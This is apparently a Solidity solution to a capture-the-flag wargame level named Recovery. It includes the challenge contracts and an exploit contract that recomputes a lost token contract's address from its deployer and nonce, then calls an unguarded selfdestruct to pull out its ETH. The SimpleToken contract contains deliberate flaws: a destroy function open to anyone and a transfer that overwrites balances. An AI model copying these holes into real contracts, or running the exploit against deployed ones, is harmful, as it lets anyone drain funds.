// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Recovery {
    //-n address simple token
    //-n this is not part of the contest - I'm just storing it to write a test case
    address public token;

    //-n constructor to receive eth
    constructor() payable {}

    //generate tokens
    function generateToken(string memory _name, uint256 _initialSupply) public {
        token = address(new SimpleToken(_name, msg.sender, _initialSupply)); //-n this is added just to recoed token address
    }

    //-n added this function to execute a eth transfer to simple token contract to mint more tokens
    function mintTokensforEth() public {
        (bool success, ) = payable(token).call{value: address(this).balance}("");
        require(success, "invalid transfer");
    }
}

contract RecoveryExploit {
    //-n key challenge in this contract to back compute the address of the SimpleToken contract deployed by Recovery address
    //-n we use the deterministic formula below to get the address deployed by sender at a given nonce
    function getDeployedContractAddress(address sender, uint8 nonce) public pure returns (address) {
        return
            address(
                uint160(
                    uint256(
                        keccak256(
                            abi.encodePacked(bytes1(0xd6), bytes1(0x94), sender, bytes1(nonce))
                        )
                    )
                )
            );
    }

    //-n get the simple token at a given address
    //-n call destroy function to transfer all ETH in the simple token contract to Recovery contract
    function destroySimpleToken(address addr, uint8 nonce) public {
        SimpleToken s = SimpleToken(payable(getDeployedContractAddress(addr, nonce)));

        s.destroy(payable(addr));
    }
}

contract SimpleToken {
    string public name;
    mapping(address => uint) public balances;

    // constructor
    constructor(string memory _name, address _creator, uint256 _initialSupply) {
        name = _name;
        balances[_creator] = _initialSupply;
    }

    // collect ether in return for tokens
    receive() external payable {
        balances[msg.sender] = msg.value * 10;
    }

    // allow transfers of tokens
    function transfer(address _to, uint _amount) public {
        require(balances[msg.sender] >= _amount);
        balances[msg.sender] = balances[msg.sender] - _amount;
        balances[_to] = _amount;
    }

    // clean up after ourselves
    function destroy(address payable _to) public {
        selfdestruct(_to);
    }
}
